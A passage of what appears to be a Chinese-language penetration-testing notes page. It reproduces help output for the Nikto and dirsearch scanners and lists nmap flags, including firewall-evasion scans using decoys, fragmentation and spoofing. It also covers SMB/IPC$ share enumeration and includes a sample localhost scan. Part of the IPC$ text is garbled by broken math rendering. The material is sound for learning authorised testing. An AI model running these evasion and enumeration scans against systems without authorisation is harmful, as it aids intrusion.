                   (if not specified the format will be taken from the file extension passed to -output)</span><br><span class="line">    -Help              Extended help information</span><br><span class="line">    -host+             Target host/URL</span><br><span class="line">    -404code           Ignore these HTTP codes as negative responses (always). Format is &quot;302,301&quot;.</span><br><span class="line">    -404string         Ignore this string in response body content as negative response (always). Can be a regular expression.</span><br><span class="line">    -id+               Host authentication to use, format is id:pass or id:pass:realm</span><br><span class="line">    -key+              Client certificate key file</span><br><span class="line">    -list-plugins      List all available plugins, perform no testing</span><br><span class="line">    -maxtime+          Maximum testing time per host (e.g., 1h, 60m, 3600s)</span><br><span class="line">    -mutate+           Guess additional file names:</span><br><span class="line">                            1     Test all files with all root directories</span><br><span class="line">                            2     Guess for password file names</span><br><span class="line">                            3     Enumerate user names via Apache (/~user type requests)</span><br><span class="line">                            4     Enumerate user names via cgiwrap (/cgi-bin/cgiwrap/~user type requests)</span><br><span class="line">                            5     Attempt to brute force sub-domain names, assume that the host name is the parent domain</span><br><span class="line">                            6     Attempt to guess directory names from the supplied dictionary file</span><br><span class="line">    -mutate-options    Provide information for mutates</span><br><span class="line">    -nointeractive     Disables interactive features</span><br><span class="line">    -nolookup          Disables DNS lookups</span><br><span class="line">    -nossl             Disables the use of SSL</span><br><span class="line">    -no404             Disables nikto attempting to guess a 404 page</span><br><span class="line">    -Option            Over-ride an option in nikto.conf, can be issued multiple times</span><br><span class="line">    -output+           Write output to this file (&#x27;.&#x27; for auto-name)</span><br><span class="line">    -Pause+            Pause between tests (seconds, integer or float)</span><br><span class="line">    -Plugins+          List of plugins to run (default: ALL)</span><br><span class="line">    -port+             Port to use (default 80)</span><br><span class="line">    -RSAcert+          Client certificate file</span><br><span class="line">    -root+             Prepend root value to all requests, format is /directory</span><br><span class="line">    -Save              Save positive responses to this directory (&#x27;.&#x27; for auto-name)</span><br><span class="line">    -ssl               Force ssl mode on port</span><br><span class="line">    -Tuning+           Scan tuning:</span><br><span class="line">                            1     Interesting File / Seen in logs</span><br><span class="line">                            2     Misconfiguration / Default File</span><br><span class="line">                            3     Information Disclosure</span><br><span class="line">                            4     Injection (XSS/Script/HTML)</span><br><span class="line">                            5     Remote File Retrieval - Inside Web Root</span><br><span class="line">                            6     Denial of Service</span><br><span class="line">                            7     Remote File Retrieval - Server Wide</span><br><span class="line">                            8     Command Execution / Remote Shell</span><br><span class="line">                            9     SQL Injection</span><br><span class="line">                            0     File Upload</span><br><span class="line">                            a     Authentication Bypass</span><br><span class="line">                            b     Software Identification</span><br><span class="line">                            c     Remote Source Inclusion</span><br><span class="line">                            d     WebService</span><br><span class="line">                            e     Administrative Console</span><br><span class="line">                            x     Reverse Tuning Options (i.e., include all except specified)</span><br><span class="line">    -timeout+          Timeout for requests (default 10 seconds)</span><br><span class="line">    -Userdbs           Load only user databases, not the standard databases</span><br><span class="line">                            all   Disable standard dbs and load only user dbs</span><br><span class="line">                            tests Disable only db_tests and load udb_tests</span><br><span class="line">    -useragent         Over-rides the default useragent</span><br><span class="line">    -until             Run until the specified time or duration</span><br><span class="line">    -update            Update databases and plugins from CIRT.net</span><br><span class="line">    -url+              Target host/URL (alias of -host)</span><br><span class="line">    -useproxy          Use the proxy defined in nikto.conf, or argument http://server:port</span><br><span class="line">    -Version           Print plugin and database versions</span><br><span class="line">    -vhost+            Virtual host (for Host header)</span><br><span class="line">             + requires a value</span><br></pre></td></tr></table></figure><ul><li><h4 id="wappalyzer-浏览器插件">wappalyzer(浏览器插件)</h4></li></ul><h4 id="常见网站架构的类型">常见网站架构的类型</h4><p>1.php+mysql+win/linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.2003 iis6.0/2008 iis7.0/2012 iis8.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. apache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.nginx</span><br></pre></td></tr></table></figure><p>2.aspx+access/mssql+win 3. 3.jsp+oracle/mysql/+win/linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.tomcat</span><br></pre></td></tr></table></figure><p>4.php+postgresql+linux</p><h3 id="span-id-目录信息-目录信息-span"><span id="目录信息">目录信息</span></h3><ul><li><h4 id="dirsearch"><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></h4></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">  Mandatory:</span><br><span class="line">    -u URL, --url=URL   Target URL</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        Target URL list file</span><br><span class="line">    --stdin             Target URL list from STDIN</span><br><span class="line">    --cidr=CIDR         Target CIDR</span><br><span class="line">    --raw=FILE          Load raw HTTP request from file (use `--scheme` flag</span><br><span class="line">                        to set the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        Extension list separated by commas (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        Exclude extension list separated by commas (Example:</span><br><span class="line">                        asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        Add extensions to every wordlist entry. By default</span><br><span class="line">                        dirsearch only replaces the %EXT% keyword with</span><br><span class="line">                        extensions</span><br><span class="line"></span><br><span class="line">  Dictionary Settings:</span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        Customize wordlists (separated by commas)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        Add custom prefixes to all wordlist entries (separated</span><br><span class="line">                        by commas)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        Add custom suffixes to all wordlist entries, ignore</span><br><span class="line">                        directories (separated by commas)</span><br><span class="line">    --only-selected     Remove paths have different extensions from selected</span><br><span class="line">                        ones via `-e` (keep entries don&#x27;t have extensions)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        Remove extensions in all paths (Example: admin.php -&gt;</span><br><span class="line">                        admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings:</span><br><span class="line">    -t THREADS, --threads=THREADS</span><br><span class="line">                        Number of threads</span><br><span class="line">    -r, --recursive     Brute-force recursively</span><br><span class="line">    --deep-recursive    Perform recursive scan on every directory depth</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   Do recursive brute-force for every found path, not</span><br><span class="line">                        only paths end with slash</span><br><span class="line">    -R DEPTH, --recursion-depth=DEPTH</span><br><span class="line">                        Maximum recursion depth</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        Valid status codes to perform recursive scan, support</span><br><span class="line">                        ranges (separated by commas)</span><br><span class="line">    --subdirs=SUBDIRS   Scan sub-directories of the given URL[s] (separated by</span><br><span class="line">                        commas)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        Exclude the following subdirectories during recursive</span><br><span class="line">                        scan (separated by commas)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        Include status codes, separated by commas, support</span><br><span class="line">                        ranges (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        Exclude status codes, separated by commas, support</span><br><span class="line">                        ranges (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        Exclude responses by sizes, separated by commas</span><br><span class="line">                        (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        Exclude responses by texts, separated by commas</span><br><span class="line">                        (Example: &#x27;Not found&#x27;, &#x27;Error&#x27;)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        Exclude responses by regexps, separated by commas</span><br><span class="line">                        (Example: &#x27;Not foun[a-z]&#123;1&#125;&#x27;, &#x27;^Error$&#x27;)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        Exclude responses by redirect regexps or texts,</span><br><span class="line">                        separated by commas (Example: &#x27;https://okta.com/*&#x27;)</span><br><span class="line">    --exclude-response=PATH</span><br><span class="line">                        Exclude responses by response of this page (path as</span><br><span class="line">                        input)</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        Skip target whenever hit one of these status codes,</span><br><span class="line">                        separated by commas, support ranges</span><br><span class="line">    --minimal=LENGTH    Minimal response length</span><br><span class="line">    --maximal=LENGTH    Maximal response length</span><br><span class="line">    --max-time=SECONDS  Maximal runtime for the scan</span><br><span class="line">    -q, --quiet-mode    Quiet mode</span><br><span class="line">    --full-url          Full URLs in the output (enabled automatically in</span><br><span class="line">                        quiet mode)</span><br><span class="line">    --no-color          No colored output</span><br><span class="line"></span><br><span class="line">  Request Settings:</span><br><span class="line">    -m METHOD, --http-method=METHOD</span><br><span class="line">                        HTTP method (default: GET)</span><br><span class="line">    -d DATA, --data=DATA</span><br><span class="line">                        HTTP request data</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP request header, support multiple flags (Example:</span><br><span class="line">                        -H &#x27;Referer: example.com&#x27;)</span><br><span class="line">    --header-list=FILE  File contains HTTP request headers</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        Follow HTTP redirects</span><br><span class="line">    --random-agent      Choose a random User-Agent for each request</span><br><span class="line">    --auth-type=TYPE    Authentication type (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   Authentication credential (user:password or bearer</span><br><span class="line">                        token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings:</span><br><span class="line">    --timeout=TIMEOUT   Connection timeout</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        Delay between requests</span><br><span class="line">    --proxy=PROXY       Proxy URL, support HTTP and SOCKS proxies (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   File contains proxy servers</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        Proxy to replay with found paths</span><br><span class="line">    --scheme=SCHEME     Default scheme (for raw request or if there is no</span><br><span class="line">                        scheme in the URL)</span><br><span class="line">    --max-rate=RATE     Max requests per second</span><br><span class="line">    --retries=RETRIES   Number of retries for failed requests</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        By default dirsearch requests by IP for speed. This</span><br><span class="line">                        will force dirsearch to request by hostname</span><br><span class="line">    --ip=IP             Server IP address</span><br><span class="line">    --exit-on-error     Exit whenever an error occurs</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        Output file</span><br><span class="line">    --format=FORMAT     Report format (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br><span class="line"></span><br><span class="line"> You can change the dirsearch default configurations (default extensions,</span><br><span class="line">timeout, wordlist location, ...) by editing the &quot;/etc/dirsearch/default.conf&quot;</span><br><span class="line">file. More information at https://github.com/maurosoria/dirsearch.</span><br></pre></td></tr></table></figure><ul><li>御剑后台扫描工具</li><li>dirbuster</li><li>pk<br><img src="/image/Snipaste_2021-04-09_21-47-30.webp" alt=""></li><li>dirmap</li></ul><h3 id="span-id-端口扫描-端口扫描-span"><span id="端口扫描">端口扫描</span></h3><ul><li><h4 id="nmap">nmap</h4></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -all ip</span><br><span class="line">-sT 使用tcp进行扫描</span><br><span class="line">-sS 半开放扫描</span><br><span class="line">-sU udp端口扫描</span><br><span class="line">-sF 也是tcp的扫描一种,发送一个fin标志的数据包</span><br><span class="line">-sV 版本检测</span><br><span class="line">-O 可以模糊测试对方系统版本PING大于67则windows</span><br><span class="line">-A 全面检测</span><br><span class="line">-sV 探测目标系统服务版本</span><br><span class="line">-T4 设置线程</span><br></pre></td></tr></table></figure><h5 id="nmap绕过防火墙扫描">nmap绕过防火墙扫描</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=firewalk --traceroute 目标</span><br><span class="line">nmap -p80 --script http-waf-detect --script-args=<span class="string">&quot;http-waf-detect.detectBodyChanges&quot;</span></span><br><span class="line">碎片扫描namp -f  nmap -mtu 8</span><br><span class="line">诱饵扫描nmap -D RND:10 </span><br><span class="line">空闲扫描nmap -P0 -sl zombie</span><br><span class="line">随机数据长度扫描 nmap --data-length 25</span><br><span class="line">欺骗性扫描nmap --sT -PN --spoof-mac aa:bb:cc:<span class="built_in">dd</span>:ee:ff</span><br><span class="line">namp --badsum 主机</span><br><span class="line">nmap -g80 -S url 主机</span><br><span class="line">nmap -p80 --script http-methods --script-args http.useragent=<span class="string">&quot;Mozilla 5&quot;</span></span><br></pre></td></tr></table></figure><h5 id="ipc共享">ipc共享</h5><p>IPC$ (Internet Process Connection) 是共享命名管道”的资源，它是为了让进程间通信而开放<br>的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行<br>加密数据的交换，从而实现对远程计算机的访问。IPC<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>是</mtext><mi>N</mi><mi>T</mi><mn>2000</mn><mtext>的一项新功能，它有一个特点，即在同</mtext><mo>−</mo><mo>−</mo><mtext>时间内，两个</mtext><mi>I</mi><mi>P</mi><mtext>之间只允许建立一个连接。</mtext><mi>N</mi><mi>T</mi><mn>2000</mn><mtext>在提供了</mtext><mi>i</mi><mi>p</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">是NT2000的一 项新功能，它有一个特点，即在同- -时间内，两个IP之间只允许建立一个连接。 NT2000在提供 了ipc</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.13889em;">NT</span><span class="mord">2000</span><span class="mord cjk_fallback">的一项新功能，它有一个特点，即在同</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">−</span><span class="mord cjk_fallback">时间内，两个</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">之间只允许建立一个连接。</span><span class="mord mathnormal" style="margin-right:0.13889em;">NT</span><span class="mord">2000</span><span class="mord cjk_fallback">在提供了</span><span class="mord mathnormal">i</span><span class="mord mathnormal">p</span><span class="mord mathnormal">c</span></span></span></span>功能的同时,<br>在初次安装系统时还打开了默认共享，即所有的逻辑共享(C<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>、</mtext><mi>D</mi></mrow><annotation encoding="application/x-tex">、D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>、 …和系统目录<br>(C:\windows)共享。所有的这些初衷都是为了方便管理员的管理。但好的初衷并不一-定 要<br>收效，一些别有用心者会利用IPC<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo separator="true">,</mo><mtext>访问共享资源，导出用户列表，并使用</mtext><mo>−</mo><mo>−</mo><mtext>些字典工为了配合</mtext><mi>I</mi><mi>P</mi><mi>C</mi><mtext>共享工作，</mtext><mi>W</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mtext>操作系统</mtext><mo stretchy="false">(</mo><mtext>不包括</mtext><mi>W</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mn>98</mn><mtext>系列</mtext><mo stretchy="false">)</mo><mtext>在安装完成后，目动设置共享的目录为</mtext><mo>:</mo><mi>C</mi><mtext>盘、</mtext><mi>D</mi><mtext>盘、</mtext><mi>E</mi><mtext>盘、</mtext><mi>A</mi><mi>D</mi><mi>M</mi><mi>I</mi><mi>N</mi><mtext>目录</mtext><mo stretchy="false">(</mo><mi>C</mi><mo>:</mo><mi>W</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mo stretchy="false">)</mo><mtext>等，即为</mtext><mi>A</mi><mi>D</mi><mi>M</mi><mi>I</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">,访问共享资源，导出用户列表，并使用- -些字典工为了配合IPC共享工作，Windows操作系统(不包括Windows 98系列)在安装完成后，目动设置共享的目录为: C盘、D盘、E盘、ADMIN目录(C:Windows)等，即为ADMIN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">访问共享资源，导出用户列表，并使用</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord cjk_fallback">些字典工为了配合</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord cjk_fallback">共享工作，</span><span class="mord mathnormal">Win</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">操作系统</span><span class="mopen">(</span><span class="mord cjk_fallback">不包括</span><span class="mord mathnormal">Win</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">s</span><span class="mord">98</span><span class="mord cjk_fallback">系列</span><span class="mclose">)</span><span class="mord cjk_fallback">在安装完成后，目动设置共享的目录为</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord cjk_fallback">盘、</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord cjk_fallback">盘、</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord cjk_fallback">盘、</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">目录</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Win</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mord cjk_fallback">等，即为</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>、C<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>、</mtext><mi>D</mi></mrow><annotation encoding="application/x-tex">、D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>、E$等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=smb-enum-shares.nse -sT</span><br></pre></td></tr></table></figure><p><img src="/image/2021-04-10-13-52-38.webp" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -v -A -p1-65535 127.0.0.1</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-10 13:58 CST</span><br><span class="line">NSE: Loaded 153 scripts <span class="keyword">for</span> scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 13:58</span><br><span class="line">Scanning localhost (127.0.0.1) [65535 ports]</span><br><span class="line">Discovered open port 22/tcp on 127.0.0.1</span><br><span class="line">Completed SYN Stealth Scan at 13:58, 0.37s elapsed (65535 total ports)</span><br><span class="line">Initiating Service scan at 13:58</span><br><span class="line">Scanning 1 service on localhost (127.0.0.1)</span><br><span class="line">Completed Service scan at 13:58, 0.01s elapsed (1 service on 1 host)</span><br><span class="line">Initiating OS detection (try <span class="comment">#1) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#2) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#3) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#4) against localhost (127.0.0.1)</span></span><br><span class="line">Retrying OS detection (try <span class="comment">#5) against localhost (127.0.0.1)</span></span><br><span class="line">NSE: Script scanning 127.0.0.1.</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.08s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Initiating NSE at 13:58</span><br><span class="line">Completed NSE at 13:58, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000018s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 95:24:8a:70:02:c1:7c:b9:63:1d:57:bd:c4:ba:59:84 (RSA)</span><br><span class="line">|   256 ac:24:26:ce:c9:34:47:e7:62:38:13:d1:03:6d:c7:54 (ECDSA)</span><br><span class="line">|_  256 79:e3:be:ae:1e:ee:87:ed:bd:3d:b3:23:e6:de:92:08 (ED25519)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=4/10%OT=22%CT=1%CU=43844%PV=N%DS=0%DC=L%G=Y%TM=60713E8</span><br><span class="line">OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS</span><br><span class="line">OS:(O1=MFFD7ST11NWA%O2=MFFD7ST11NWA%O3=MFFD7NNT11NWA%O4=MFFD7ST11NWA%O5=MFF</span><br><span class="line">OS:D7ST11NWA%O6=MFFD7ST11)WIN(W1=FFCB%W2=FFCB%W3=FFCB%W4=FFCB%W5=FFCB%W6=FF</span><br><span class="line">OS:CB)ECN(R=Y%DF=Y%T=40%W=FFD7%O=MFFD7NNSNWA%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A</span><br><span 